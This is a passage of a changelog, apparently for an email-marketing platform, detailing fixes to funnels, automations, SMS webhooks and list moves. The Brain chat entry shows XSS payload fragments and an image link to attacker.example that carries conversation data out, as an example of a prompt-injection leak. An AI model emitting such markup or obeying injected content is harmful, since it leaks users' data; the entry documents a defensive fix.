...
- **MCP client 1.5.0 builds whole funnels:** `add_funnel_step` sent only a step's type, name, email, delay and condition type, so an assistant could not set a condition's details, an action, an SMS, a *wait until* or reminders, and had no way to fix a step once added. It now passes every step setting the API accepts (including the path after a condition, `branch`), and new tools cover the rest: `update_funnel` (name and trigger), `update_funnel_step` (settings and connections), `delete_funnel_step` and `enroll_subscriber_in_funnel`. `get_funnel` lists each step with the settings of its type and its connections. The MCP page in *Marketplace* and the suggested agent prompt name the new tools. Published to npm as `@netsendo/mcp-client@1.5.0`; Docker installs get it when the `mcp` service is rebuilt.
- **Reply detection — a subscriber's reply reaches the CRM, automations and lead scoring:** `App\Events\CrmContactReplied` had listeners (a CRM history entry, the `crm_contact_replied` trigger in `TriggerAutomationsListener`, the *Email Replied* scoring rule every account gets by default, +25 points), but nothing dispatched it, because nothing read replies: the bounce IMAP scanner reads only the Return-Path mailbox and keeps only delivery reports. The listeners were broken as well. `CrmEventListener` wrote a CRM activity of type `email_reply`, which the `crm_activities.type` enum does not allow (a `QueryException` in MySQL strict mode and on SQLite, thrown to the dispatcher). No rule could use `crm_contact_replied`, which was missing from `AutomationRule::TRIGGER_EVENTS` and from the MySQL `automation_rules.trigger_event` enum.
  - **Settings → Mailboxes → edit → *Reply detection*** takes the IMAP login of the inbox that receives replies (the sender or Reply-To address), with a connection test. `replies:process-mailboxes` scans it every five minutes. The inbox is the user's own, so the folder is opened read-only (`EXAMINE`) and messages are fetched with `BODY.PEEK`: nothing is marked as read, moved or deleted. The highest IMAP UID read is stored with the folder's UIDVALIDITY, so a scan reads only messages that arrived since the previous one. The first scan, and the first after the server, folder or login changes, looks back one day. Headers are downloaded first, and a full message only when it is a reply from a subscriber.
  - **What counts as a reply:** a message from the address of one of the mailbox owner's subscribers with `In-Reply-To` or `References`, or a subject starting with `Re:`, `Odp:`, `AW:`, `SV:` or a similar prefix. A new conversation does not count. Automatic messages are skipped: `Auto-Submitted` other than `no`, `X-Autoreply` / `X-Autorespond`, `Precedence: bulk|junk|list|auto_reply`, `List-Id` / `List-Unsubscribe`, an empty `Return-Path`, `multipart/report`, and out-of-office subjects (*Automatic reply*, *Odpowiedź automatyczna*, *Out of Office* and others). So are messages from the mailbox's own addresses.
  - **A recorded reply** adds *Email Reply* to the contact's history with the subject and the first ~300 characters of the reply, without the quoted conversation. It runs rules on the new *💼 CRM: Kontakt odpowiedział* trigger and applies the *Email Replied* scoring rules. A subscriber not yet in the CRM is added as a lead with source `email_reply`; a contact deleted from the CRM is not brought back. The reply's Message-ID is stored with the activity, so a reply read twice (a recreated folder, two mailboxes on one inbox) is recorded once. No notification is sent; an automation with *Notify administrator* can send one.
  - **Migrations** add the reply inbox columns to `mailboxes` and, for MySQL, `email_reply` to the `crm_activities.type` enum and `crm_contact_replied` to the `automation_rules.trigger_event` enum. The rules run once per reply, from `TriggerAutomationsListener`. Notes in a CRM contact's history now keep their line breaks. Covered by `tests/Feature/CrmContactReplyDetectionTest.php`.
...
- **Inactive subscribers are no longer recipients at all — neither planned nor counted:** since 2.1.3 the CRON send gate skips a subscriber marked *Inactive* (`is_active_global = false`). The recipient sync still planned them for every broadcast of their lists, though, so every audience figure counted them: a message's planned recipients, the editor's *Estimated recipients*, the autoresponder schedule and *Send to missed*, and the A/B test split. The 2.1.3 note "Contacts are still planned as recipients, so audience counts do not change" no longer holds.
  - **One audience definition.** `SubscriberFieldFilterService::audienceQuery()` now requires the flag. `Message::getUniqueRecipients()` and `Message::getQueueScheduleStats()` had repeated the list query by hand; both now build on it, so the queue sync, the schedule and the estimate cannot drift apart. Individually picked CRM contacts are filtered the same way. A broadcast therefore plans no queue entry for an inactive member: they appear in its report neither as skipped nor as sent, and `planned_recipients_count` leaves them out. A `POST /api/v1/email/batch` sent to a list left them out when it was accepted, and the first sync no longer adds them back (in 2.1.3 it planned them, and the gate then skipped them).
  - **Entries planned before a deactivation are left to the send gate.** The sync drops the pending entries of subscribers who left the audience, marking them skipped with *Subscriber removed from list or unsubscribed*. A subscriber who is only marked inactive is exempt: their entry stays planned, and the CRON gate skips it once it is due with *Subscriber is marked inactive*, exactly as in 2.1.3. An autoresponder step still ahead therefore still waits for the contact to be reactivated. Brain's `PerformanceTracker`, which counts skipped entries whose reason mentions unsubscribing, does not count a deactivation as an unsubscribe. The autoresponder schedule does not count such a waiting entry as *pending*. A contact who is inactive and has also left the list keeps that entry until it is due and is then skipped as inactive; reactivated before then, the next sync drops the entry as before.
  - **Reactivating** a contact (*Active* in the interface or the API, a double opt-in confirmation, the resubscribe link) makes them a recipient again. The next sync plans them for broadcasts that have not started sending, and an autoresponder step still ahead goes out — through the waiting entry, or one the sync backfills as for any other member. Delivery is otherwise unchanged from 2.1.3: `POST /api/v1/email/send` to an inactive contact is still skipped by CRON. List member counts still include inactive members, who remain on the list. Covered by `tests/Feature/InactiveSubscriberAudienceTest.php` and `tests/Feature/InactiveSubscriberDeliveryTest.php`.

### Fixed

- **No SMS was ever sent — behaviour change for existing installs:** `SendSmsJob` filled in placeholders through `PlaceholderService::process()`, a method that has never existed, so since SMS sending was added (December 2025) every SMS job — broadcasts, autoresponders, `POST /api/v1/sms/send` and the batch endpoint — ended in `Call to undefined method` before reaching the provider, was retried three times and failed. It now uses `replacePlaceholders()`, as emails do. SMS already marked failed are not re-sent; everything queued from the update on goes out through the account's SMS provider. Covered by `tests/Feature/FunnelStepExecutionTest.php`.
- **Webhooks and n8n workflows on `sms.sent` and `sms.failed` never fired:** both events are in the webhook catalogue (`Webhook::EVENTS`) and offered by the n8n trigger, but nothing dispatched them — only `sms.queued`, from the SMS API. `SendSmsJob` (broadcasts, autoresponders, `POST /api/v1/sms/send` and `/sms/batch`) and `SendFunnelSmsJob` (funnel SMS steps) now dispatch `sms.sent` once the provider has accepted an SMS and `sms.failed` once it will not go out. A rejection by the provider, a subscriber without a phone number, no active provider or a reached daily limit report `sms.failed` at once; an exception (a gateway timeout, say) is retried, and `sms.failed` goes out once, from the job's `failed()`, after the third attempt has failed too — a retry that goes through reports only `sms.sent`. Both jobs send the same fields: `message_id` (campaign or API SMS) or `funnel_step_id` (funnel SMS), the other one `null`; `subscriber_id`, `phone` and `provider` (the provider's name, `null` when none was found). `sms.sent` adds `content` with placeholders filled in, `provider_message_id`, `credits` and `parts`; `sms.failed` adds `error` and `error_code` — the provider's code, or `NO_PHONE`, `NO_PROVIDER`, `DAILY_LIMIT` or `EXCEPTION`. A webhook that cannot be dispatched is logged and does not fail the job, so it cannot get the SMS sent again. SMS sent or failed before the update are not reported. The sample payloads in `docs/N8N_SMS_IMPLEMENTATION.md`, which described fields nothing sent, now match. Covered by `tests/Feature/SmsWebhookEventsTest.php`.
- **Funnels did little beyond their first email — behaviour change for existing installs:** the funnel engine and builder offered triggers, step types, conditions and actions that did nothing, or failed.
  - **Triggers start funnels.** Nothing read a funnel's trigger: a funnel set to start on a list signup, a form or a tag never enrolled anyone, and only an automation's *Start funnel* action put subscribers into a funnel. The queued `EnrollInTriggeredFunnels` listener now enrolls on `SubscriberSignedUp` (list signup, while the membership is still active; form — its own signup event, or the confirmation of a double opt-in signup made through that form) and on `TagAdded` (the trigger tag's name, case-insensitive), in active funnels of the same account, once per subscriber. **After the update every active funnel with such a trigger starts enrolling new signups and taggings**; subscribers who signed up or were tagged before are not enrolled retroactively. Review active funnels before deploying.
  - **Conditions.** *Email opened* and *Email clicked* called `Subscriber::trackingEvents()` and *Subscriber has tag* `Subscriber::hasTag()`, neither of which exists, and *Specific link clicked* was not evaluated at all. They now read `email_opens`/`email_clicks` (without a chosen email: the last one the funnel queued for the subscriber; a link by its URL) and the account's tag by name. `FunnelRetryService` re-checked waiting conditions with its own copy that knew fewer types, so a waiting *Field has value* was never met; it now uses the same evaluation.
  - **Actions.** *Add tag* and *Remove tag* passed the tag's name where `Subscriber::addTag()` needs a tag, *Unsubscribe from list* (and the *Unsubscribe* action after reminders run out) called `Subscriber::unsubscribeFromList()`, which did not exist, and *Send notification* only wrote a log line. Tags are now found by name (*Add tag* creates a missing one, as the automation action does); the new `unsubscribeFromList()` changes only an active membership, drops what is still planned for the list and fires `SubscriberUnsubscribed`, from the chosen list or else the trigger list of a list signup funnel; the notification is emailed to the chosen address or else the funnel owner, with `{{subscriber_email}}`, `{{subscriber_name}}` and `{{funnel_name}}`.
  - **SMS and "wait until" steps run.** Both were skipped. An SMS step queues its text through the new `SendFunnelSmsJob` (no message record, so nothing appears among SMS campaigns) and is skipped, like an email step, for a subscriber who is not deliverable or has no phone number. A *Wait until* step holds the enrollment until a date and time, the next chosen weekday at a time (new column `funnel_steps.wait_until_day`, migration `2026_09_14_160000_add_wait_until_day_to_funnel_steps_table.php`) or business hours (Monday to Friday, 9:00–17:00), in the step's time zone, else the owner's.
  - **Reminders.** A reminder without an email of its own looked for the condition step's email, which it never has: nothing was sent or counted, the warning was logged every minute and the *after exhausting attempts* action never applied. It now resends the email the condition is about, and when there is none it counts the attempt as skipped.
  - **Builder.** The email list offered only messages with status `ready`, which only Brain creates, so an email written in the editor could not be chosen; it now lists the account's emails. The ✓/✗ handles of a condition opened nothing, so its branches could not be connected; they do now, and a new connection replaces the old one on the same handle. A connection removed in the builder was kept on save. Conditions gained their settings (email, link, tag, field/operator/value, task ID) and *Wait for condition* with reminders — the engine supported them, but nothing could set or save them; *Unsubscribe* gained its list, *Send notification* its recipient, subject and message, *Wait until* its weekday. About twenty labels of the builder that were missing in every language (SMS, wait until, goal, A/B test, zoom, undo) were added in all four.
  - **Pausing and resuming.** Resuming set every paused enrollment to `active`, which nothing picks up: one paused during a delay or while waiting for its condition stayed there for good. It now returns to waiting (a delay already due resumes on the next run), and one paused before its step ran runs it. Enrollments waiting for a condition can be paused and are labelled in the funnel statistics.
  - **API.** `POST /api/v1/funnels/{id}/steps` created steps without connecting them, and the engine follows connections, not the order: a funnel built over the API completed right after its start step. A step is now connected after the previous one — `after_step_id`, else the last step — and inserted into the chain; after a condition it goes on the `yes` path unless `branch: "no"` is given. The endpoint also accepts `action_type`, `action_config` and `sms_content`, and rejects an unknown `condition_type` instead of storing it.
  - Covered by `tests/Feature/FunnelTriggerEnrollmentTest.php`, `tests/Feature/FunnelStepExecutionTest.php` and `tests/Feature/FunnelBuilderAndManagementTest.php`.
- **The funnel condition *Field has value* could not test standard fields, read other accounts' field defaults and compared loosely — behaviour change for existing funnels:** the condition read custom fields only, so a field typed as `first_name`, `email` or `language` never had a value; a subscriber with no value got the default of the first custom field of that name in the whole installation, whichever account it belonged to; and it compared with PHP's loose `==`, case-sensitively.
  - **Standard fields count.** The condition now reads, by name, a custom field of the subscriber's account, or else one of the subscriber's standard fields: email, first name, last name, phone, gender (`male`/`female`/`other`), language, source, device, IP address, signup date and confirmation date (`YYYY-MM-DD HH:MM:SS`); `fname` and `lname` stand for first and last name, as in placeholders. An account's own custom field of the same name (`gender` and `language` are not reserved names) keeps precedence, so conditions that already read it are unchanged.
  - **Custom fields are scoped to the account.** `Subscriber::getCustomFieldValue()` considers only the account's fields that apply to the subscriber: global ones, those of a list the subscriber is on and any the subscriber holds a value for (the global one first when a name is defined for both). The subscriber's own value wins; otherwise that field's default. `Subscriber::setCustomFieldValue()`, used by the subscriber API (`custom_fields`) and the Calendly integration, had the same unscoped lookup and could store a value on another account's field of the same name; it now writes to the account's field.
  - **Operators compare trimmed text, ignoring case**, as a message's field filters do on MySQL: *equals* and *does not equal* compare the whole text (a field without a value "does not equal" any text), *contains* is never met while its value is empty (it used to be met by everyone), and *is filled in* / *is empty* ignore surrounding whitespace — `0` now counts as filled in, where it used to be empty. Numbers are compared as text: `10.0` no longer equals `10`.
  - **Builder.** The free-text field name became a list of the standard fields and the account's custom fields (`conditionFields`, passed by `FunnelController::create()`/`edit()`), with hints for the values of gender, language and dates. A field saved earlier that is not on the list stays selected and is marked as such. Waiting conditions (`FunnelRetryService`) use the same evaluation. Covered by `tests/Feature/FunnelFieldValueConditionTest.php`.
- **The funnel A/B test (split) step did not branch:** the step drew each subscriber into a variant by weight and counted the enrollment, but every variant then continued on the step's single next step — nothing could give a variant a path of its own. The builder had one connection handle for the step, the builder save and `prepareForBuilder()` knew only `next_step_id` and the yes/no paths of a condition, and the API refused `split` steps.
  - **Each variant leads down its own path.** A variant's path is stored with it in `funnel_steps.split_variants` (`[{key, name, weight, next_step_id}]`, no migration); `key` identifies the variant, so renaming, reweighting or removing another variant keeps its path and its results. Variants saved earlier get `v1`, `v2`… by position, the order their test variants were created in. The engine continues on the drawn variant's path; a variant without one — every variant of an existing split step until it is connected — continues on the step's own next step, as before. A path to a step outside the funnel is ignored.
  - **The test follows the step.** The step's A/B test (`funnel_ab_variants`, matched by key) takes renamed, reweighted, added and removed variants when the funnel is saved or the step is reached, so weights changed after the test started are honoured. Removing a variant deletes its test variant and results.
  - **A declared winner takes the traffic.** Once conversions on goal steps declare a winner (`ABTestService::checkForWinner()`), every new subscriber takes the winner's path without being counted in the finished test (history `ab_test_winner_followed`); until now they all fell back to the default path. Removing the winning variant reopens the test for the variants left. `ProcessAbTestsJob` evaluates email A/B tests only and is unaffected.
  - **Builder.** A split step has a handle per variant (A, B, C…, like a condition's ✓/✗) and the `+` handle for the default path; a new connection replaces the one on the same handle. The variant list shows each variant's letter and where its subscribers go, removing a variant removes its path, and the block shows the variants' weights. Duplicating a funnel and funnel templates keep the variant paths. New labels in pl/en/de/es.
  - **API and MCP.** `POST /api/v1/funnels/{id}/steps` accepts `type: "split"` with `split_variants` (2–5 variants, `key`, `name`, `weight`; A and B, 50/50, by default) and `variant` (key or name) to add a step on that variant's path. `PUT /api/v1/funnels/{id}/steps/{stepId}` sets a variant's path with `split_variants[].next_step_id` (a variant naming none keeps its path) and `DELETE` reconnects variant paths that led to the deleted step. The MCP client (1.5.1) passes `split`, `split_variants` and `variant`, and `get_funnel` shows each split step's variants.
  - **Funnel statistics page.** It failed on every funnel — `FunnelService::calculateTimeMetrics()` used an unimported `FunnelSubscriber` and a nonexistent `enrolled_at` column — so the A/B test results could not be seen; completion times now use `entered_at`.
  - Covered by `tests/Feature/FunnelSplitStepTest.php`.
- **Automation rule conditions on a field failed and stopped every rule for their event — behaviour change for existing rules:** *Field equals*, *Field not equals*, *Field contains*, *Field is empty* and *Field is not empty* looked a custom field up by a `slug` column that `custom_fields` does not have. On MySQL the query failed (`Unknown column 'slug'`), and since conditions are checked before any rule runs, the error ended the whole event: no automation rule for it ran — neither the account's other rules nor, when the failing rule had no trigger settings, other accounts' rules (on SQLite the condition was quietly never met). The builder also had no way to choose the field, so a field condition saved there had none.
  - **Fields are read as in the funnel condition *Field has value*.** The condition reads the field named in `field`: a custom field of the subscriber's account (global, of a list the subscriber is on, or one they hold a value for; their own value, else the field's default), or else a standard field — email, first name, last name, phone, gender, language, source, device, IP address, signup date and confirmation date (`Subscriber::getFieldValue()`).
  - **Values compare as in funnels** (`Subscriber::matchesFieldCondition()`, now shared by both): trimmed text, ignoring case — the email, first name, last name and phone conditions, which did work, were case-sensitive; *Field contains* with an empty value is never met (it matched everyone); `0` counts as filled in and whitespace alone as empty; a field with no value does not equal any text; a condition without a field is never met, whatever its type.
  - **Builder.** A field condition now offers a list of the standard fields and the account's custom fields (`conditionFields`, passed by `AutomationController::create()`/`edit()` from `Subscriber::conditionFields()`, which the funnel builder uses too) and a value, except for *is empty* / *is not empty*, with hints for gender, language and dates. A field saved earlier that is not on the list stays selected and is marked as such. Covered by `tests/Feature/AutomationFieldConditionTest.php`.
- **Brain chat ran HTML and `javascript:` links from a reply (stored XSS):** *Brain* rendered every message with `marked`, which has no sanitizer, straight into the page, so raw HTML in a message (`<img src=x onerror=…>`) ran and `[x](javascript:…)` links worked. Brain replies quote content nobody in the account controls — incoming emails, web research results, subscriber data — so such a reply could run script in an administrator's session. Messages now go through the same renderer as the release notes on the Updates page (`resources/js/utils/safeMarkdown.js`, shared by both): raw HTML is shown as text, links and images are kept only for `http(s)` and `mailto` (links open in a new tab), and any other link keeps just its label. Markdown formatting, line breaks, code, tables and the source links of web research look as before. Stored conversations need no migration: they are rendered safely the next time they are opened.
  - **Images in Brain messages are shown as links.** An image loads the moment the message is displayed, so a reply steered by injected content (`![](https://attacker.example/?d=…)`) could send data from the conversation to another server without anyone clicking. Brain now renders `![alt](https://…)` as a link to the image, labelled with its alt text or, without one, its address; an image used as a link's label shows its alt text. Release notes on the Updates page still show images.
...
- **Event listeners ran twice — two new-subscriber notifications per signup, double lead-scoring points:** Laravel 11+ `Application::configure()` registers the framework's own event provider, which auto-discovers every `handle*()` method with a typed event parameter in `app/Listeners`. `App\Providers\EventServiceProvider` maps the same listeners explicitly (its `shouldDiscoverEvents()` returning `false` only covers that provider), so 22 event–listener pairs were registered twice — `php artisan event:list` showed both `SendNewSubscriberNotification` and `SendNewSubscriberNotification@handle` for `SubscriberSignedUp`. Listeners taking an untyped `object $event` (`TriggerAutomationsListener`, `DispatchWebhooksListener`) were registered once.
  - **What ran twice:** on a signup the *new subscriber* notification to the list owner went out twice, and `CreateAutoresponderQueueEntries` ran twice. Its existing-entry check kept a second queue row out, but the second run reset the entry the first had just created back to planned, so a day-0 autoresponder that CRON had picked up in between could be sent again. An unsubscribe sent the confirmation email twice. `LeadScoringListener` scored every open, click, bounce, form submission, page visit, pixel product view, add-to-cart, checkout, tag change and new CRM contact twice unless the rule has a cooldown (the default is none). `CrmEventListener` sent the overdue-task notification twice and ran the `crm_deal_stage_changed` automations one extra time. `FollowUpSequenceListener` was queued twice but skips contacts already enrolled.
  - **Discovery is now off** (`->withEvents(discover: false)` in `bootstrap/app.php`), so the explicit map is the only registration. `event:list` shows each listener once, with the same listeners per event as before except `CrmAutomationListener`, which had been registered by discovery alone and is removed (next entry). Covered by `tests/Feature/EventListenerRegistrationTest.php`, which also fails when a listener added to `app/Listeners` is not registered in `EventServiceProvider`.
- **CRM automation rules ran their actions two or three times per event:** three listeners passed the same CRM events to `AutomationService::processEvent()`: `TriggerAutomationsListener` (mapped for every CRM event in `EventServiceProvider::$listen`), the queued `CrmAutomationListener`, and `CrmEventListener` for stage changes and overdue tasks. A rule on `crm_deal_stage_changed` or `crm_task_overdue` therefore ran three times per event (four before the discovery fix above), and a rule on `crm_deal_created`, `crm_deal_idle`, `crm_task_completed`, `crm_contact_created`, `crm_contact_status_changed` or `crm_score_threshold` ran twice, the second time from the queue. A *create task* action created as many tasks, a score change was applied as many times, and emails and webhooks went out as many times. `crm_deal_won` and `crm_deal_lost` ran once.
  - **`TriggerAutomationsListener` is now the only listener that runs rules for CRM events**, as it already was for every other trigger. A move into a won or lost stage fires `crm_deal_stage_changed` and then `crm_deal_won` or `crm_deal_lost` from it, in the same request instead of a queued job. `CrmAutomationListener` is removed. `CrmEventListener` keeps its log entries and the won-deal and overdue-task notifications, and no longer calls `processEvent()`. Covered by `tests/Feature/CrmAutomationTriggerCountTest.php`, which counts the triggers each CRM event fires and how many times a rule runs when a deal is won.
...
- **Subscribers can be filtered by status ([#31](https://github.com/NetSendo/NetSendo/issues/31)):** the subscriber table gained a status filter — *Active*, *Inactive*, *Bounced*, *Unsubscribed* — next to the list-type filter, so undeliverable addresses can be found and cleaned up without opening contacts one by one. The export dialog follows it: exporting "the current filter" with *Bounced* selected exports exactly the bounced contacts the table shows (`status` is accepted by `POST /subscribers/export`).
- **The MCP client is published from CI with provenance:** `@netsendo/mcp-client` was released by hand from a laptop, which since 1 May 2026 is also what n8n forbids for community nodes and what npm discourages generally — a hand-published package carries no attestation, and the release depended on one machine being logged in. `.github/workflows/publish-mcp.yml` publishes it on a `mcp-v*` tag through OIDC Trusted Publishing: no token is stored anywhere, npm exchanges the GitHub identity for a short-lived credential and attaches the provenance statement itself. The tag prefix is deliberately its own — the application's `release.yml` tags `v<version>` from the VERSION file, and neither it nor the image build reacts to tags — so the client and the platform release independently. The workflow refuses to publish when the tag and `mcp/package.json` disagree, because npm never lets a version number be reused.
- **The npm-distributed integrations report their version like the WordPress plugins do:** `plugin/heartbeat` accepted only `wordpress` and `woocommerce`, and `config/netsendo.plugins` knew only those two, so an account owner had no way of seeing which version of the n8n community node or the MCP client anybody was running — the two integrations that are updated by the customer, not by a deploy. Both are now registered in that config (with their npm page as the download URL), the heartbeat accepts any type present in the registry instead of a hard-coded pair, and the connection summary carries a counter per integration rather than two fixed ones. The n8n node (1.3.2) reports in when a trigger is activated.

### Fixed

- **Funnels stopped at the first delay or condition wait, and a condition wait failed on MySQL:** a funnel runs its steps inline at enrollment until it reaches a delay or a condition step with *Wait for condition*. Continuing from there is the job of `FunnelExecutionService::processReadyEnrollments()` (delays) and `FunnelRetryService::processWaitingEnrollments()` (condition checks, reminders, the *After exhausting attempts* action), but nothing called the first, and `funnels:process-retries`, which calls the second, was not in the schedule. An enrollment that reached a delay stayed `waiting` for good, and no step after a delay was ever run.
  - **New `funnels:process` runs both every minute** (`routes/console.php`, `withoutOverlapping`, output in `storage/logs/cron-funnels.log`). It replaces `funnels:process-retries`, which still works as an alias. Enrollments whose delay has already passed resume on the first run after the update and get their next step, usually an email, straight away; `SELECT COUNT(*) FROM funnel_subscribers WHERE status = 'waiting' AND next_action_at <= NOW()` shows how many. Enrollments of a paused funnel are not resumed until it is activated again.
  - **The `waiting_condition` status can be stored.** `FunnelExecutionService` sets it when a waiting condition is not met yet, but the `funnel_subscribers.status` enum never allowed it: MySQL in strict mode rejected the update (`1265 Data truncated for column 'status'`), so processing threw at that step. Migration `2026_09_14_140000_add_waiting_condition_to_funnel_subscribers_status.php` adds the value, at the end of the enum so MySQL changes it in place. `funnel_steps.condition_type` has allowed `task_completed` on MySQL since `2026_01_01_150002`; the migration adds it to the SQLite test schema only.
  - **A met condition runs its branch.** When the condition was met, or the reminders ran out with *Continue funnel*, `FunnelRetryService` moved the enrollment to the YES or NO step without running it, and nothing picks up an `active` enrollment, so it stayed there. That step now runs at once, like a step reached during enrollment.
  - **The last reminder gets its interval.** Once the maximum number of reminders had been sent, the *After exhausting attempts* action (continue, mark as inactive, unsubscribe from list) applied on the next check, which with this schedule means a minute after the last reminder. It now waits one reminder interval after it.
  - **A delay that ends the funnel completes the enrollment.** The enrollment stayed on the delay step, so every resume started the same delay again. It now completes once the delay has passed.
  - **No enrollment is left out of a run.** Both methods took the first 100 matching enrollments. Enrollments of paused funnels were skipped but still matched, and enrollments whose condition was not met yet stayed in the set, so behind 100 of either, nothing else was ever checked. Paused funnels are now filtered out in the query, all matching enrollments are processed in batches of 100, and an error on one enrollment is logged without ending the run. Covered by `tests/Feature/FunnelScheduledProcessingTest.php`.
- **Automation and funnel emails reached bounced, unsubscribed and inactive subscribers:** broadcasts and autoresponders go out through the CRON send gate (`CronScheduleService`), which skips all three, but three paths dispatch `SendEmailJob` directly and checked neither of a subscriber's global markers — the `status` column nor the `is_active_global` flag: the automation `send_email` action (`AutomationActionExecutor`), the funnel email step (`FunnelExecutionService`) and the funnel retry reminder (`FunnelRetryService`). So an address that had bounced, a globally unsubscribed contact, or one an admin had marked *Inactive* still received every automation and funnel email. All three now check the new `Subscriber::isDeliverable()` — `active` status with the flag on, the same rule as `display_status` — and skip the send otherwise:
  - **Automations:** the `send_email` action is skipped and logged, and its result in the rule log reads `queued: false` with the reason (e.g. `skipped: "Subscriber is bounced"`). A skipped send is not an error: the rule is still logged as successful and its other actions — tags, webhooks, CRM — run as before.
  - **Funnel email steps:** the email is skipped, the enrollment history records `email_skipped` with the reason, and the funnel moves on to the next step, as CRON does with a due autoresponder. A subscriber reactivated before a later email step (during a delay, say) gets that email.
  - **Funnel retry reminders:** the reminder is not sent, but the attempt is still counted (history `retry_skipped`), so the retry interval and the step's *retries exhausted* action apply as usual instead of the reminder being retried on every run.
  - `SendEmailJob` itself still does not check, like the CRON path: the gate applies when a send is dispatched. The `SendTestEmailCommand` test send is unchanged. Covered by `tests/Feature/NonDeliverableSubscriberSendTest.php`.
- **Funnels never got past their start step:** `FunnelExecutionService::processNextStep()` reads the enrollment's `currentStep` relation, and `FunnelSubscriber::moveToStep()` changed `current_step_id` without refreshing that relation once it was loaded. After the first move, processing therefore ran the same step again, recursively, until PHP gave up. A subscriber enrolled in a funnel (by an automation's *Start funnel* action) never reached the first email, delay or action: the enrollment was left `active` on the step after *start*, with the start step repeated many times in its history, and nothing picks up enrollments in that state. `moveToStep()` now keeps the relation in sync. Enrollments already stuck this way are not resumed. New enrollments do run, so funnels that never sent anything will now start emailing the subscribers enrolled from here on.
- **API transfers, funnel and automation moves and list deletion also turned opt-outs into active subscriptions on the target list:** the entry below fixed the bulk *Move to list* action, but every other path that moves or transfers subscribers between lists had the same flaw — it acted on memberships whatever their status, so people who had unsubscribed from the source list, bounced on it or not confirmed a double opt-in were signed up to the target list and its sequences started.
  - **`POST /api/v1/lists/{id}/members/move` and `/copy` transfer only active members of the source list.** The selection comes from `subscriber_ids`, `emails` and `filter` (which accepts `status: all`), and `ListMembershipController::transfer()` attached every contact it resolved to the target list — including non-active members and contacts not on the source list at all — while a move detached the source row whatever its status. Those contacts are now left untouched and counted in a new `not_active_on_source` field next to `transferred` and `already_on_target`, and the `message` states all three. A move detaches only an active membership, in one transaction with the target membership, and `SubscriberSignedUp` fires after it commits. **For API and MCP clients:** a transfer that names non-active members still returns `200`, now with those contacts in `not_active_on_source` instead of `transferred`.
  - **Funnel *Move to list* steps move only an active membership.** `Subscriber::moveToList()` detached the source row whatever its status; it now detaches only an active one and returns `false` without touching anything otherwise. It also checks the target list exists before detaching, so a missing target no longer drops the subscriber from the source list.
  - **Automation *Move to list* acts only on an active membership of the list the trigger came from.** `AutomationActionExecutor` did not use `moveToList()`: it set that membership to `unsubscribed` whatever it was — relabelling a bounced membership, and on a *Form submitted* trigger for a double opt-in form skipping the confirmation — then subscribed the contact to the target list. A contact not active on the trigger list is now skipped, and the rule log records `moved: false` with the reason. **Behaviour change:** a *Move to list* rule on *Subscriber unsubscribed*, on *Email bounced* once the address has been marked bounced, or on *Form submitted* for a double opt-in form no longer moves anyone, because the membership is not active when the rule runs. Rules whose trigger carries no list (e.g. *Tag added*) still add the contact to the target list.
  - **Deleting an email or SMS list with a transfer moves only its active members.** The delete dialog counts active members, but `MailingListController@destroy` and `SmsListController@destroy` transferred every row of the list. Unsubscribed, bounced and unconfirmed memberships now stay with the deleted list — it is soft-deleted, so their history is kept — and nobody is added to the target list in their place.
  - **Copying or adding to a list no longer restarts sequences for subscribers already active there.** Bulk *Copy to list* and *Add to list* and the automation *Copy to list* action fired `SubscriberSignedUp` for every subscriber; they now fire it only for a new or reactivated membership. Who can be copied or added is unchanged: these actions have no source list and add whoever is selected.
  - **Reactivating a membership that had bounced on the target list resets its `soft_bounce_count` on every path.** The new `Subscriber::activateListMembership()` is shared by `addToList()`, `moveToList()`, the bulk actions, the automation actions and the API. The API's `trigger_automations: false` path resets the count too. Otherwise the next temporary failure would mark the membership bounced again.
  - Rows already moved this way cannot be recovered by this fix. Covered by `tests/Feature/Api/ListMembershipTransferTest.php`, `tests/Feature/AutomatedListMoveTest.php`, `tests/Feature/ListDeleteTransferTest.php` and `tests/Feature/SubscriberBulkListMembershipTest.php`.
- **Moving subscribers between lists turned an unsubscribe into a new subscription:** the bulk *Move to list* action lets you pick any list as the source, independently of the current filter, and the subscriber table shows everyone who is active on *any* list — but `SubscriberController@bulkMove` detached every selected subscriber from the source list whatever their status there, then subscribed them active to the target list and fired `SubscriberSignedUp`. Moving "from list Y" someone who had unsubscribed from Y, bounced on Y or not yet confirmed a double opt-in on Y hard-deleted that `contact_list_subscriber` row — the opt-out record with its `unsubscribed_at`, the per-list bounce record with its `soft_bounce_count`, the pending signup — and started the target list's sequences for a person who had asked not to be mailed.
  - **Only active members of the source list are moved.** Anyone whose membership on the source list is `unsubscribed`, `bounced` or `pending` is skipped entirely: the row stays as it is, nothing is added to the target list and no event is fired. The flash message reports the real number moved and how many were skipped; when nobody could be moved it says so as an error instead of claiming success. The move runs in one transaction and the events fire after it commits.
  - **Moving onto a list the subscriber is already active on no longer restarts sequences.** `SubscriberSignedUp` is fired only for a new membership or a reactivated one, as the edit form and `Subscriber::addToList()` already do. Reactivating a membership that had bounced on the target list resets its `soft_bounce_count`, so the next temporary failure does not mark it bounced again.
  - **Bulk *Remove from list* removes only active memberships.** The table only lets you select active members of the filtered list, but `bulkDeleteFromList` itself detached whatever `list_id` it was given; it now removes active memberships only and reports how many it actually removed.
  - Rows already deleted this way cannot be recovered by this fix. Covered by `tests/Feature/SubscriberBulkListMembershipTest.php`.
- **Funnel *Move to list* steps moved nobody:** the funnel builder shows one list selector for *Move to list* and *Copy to list* and saves it as `action_config.list_id`, but `FunnelExecutionService::actionMoveToList()` read only `from_list_id` and `to_list_id` — keys nothing in the product writes — and did nothing unless both were set. Every move step saved in the builder was passed over without a trace (the enrollment history still logged `action_executed`), so subscribers stayed on their list and never joined the target list.
  - **The step moves subscribers off the list you choose, or off the funnel's trigger list.** The builder now shows a *From list* selector above *Target list* for *Move to list*. Left on its default, a step in a *List signup* funnel moves the subscriber off the funnel's trigger list, so move steps already saved with only a target start working without being edited. Other trigger types have no default: the builder flags a step without a source list, and such a step moves nobody. A `trigger_list_id` left behind after switching a funnel away from *List signup* is ignored, because it is not cleared and the builder no longer shows it.
  - **Only an active membership of the source list is moved,** as described in the list-transfer entry above: someone who unsubscribed from the source list, bounced on it, has not confirmed a double opt-in or is not on it keeps their record and is not signed up to the target list. A step whose source and target are the same list is skipped, so it cannot restart that list's sequences.
  - **A move that moves nobody says why.** The enrollment history records `list_moved` with the source and target list, or `list_move_skipped` with the reason (target list not found, no source list, same list, not active on the source list). The funnel continues to the next step either way.
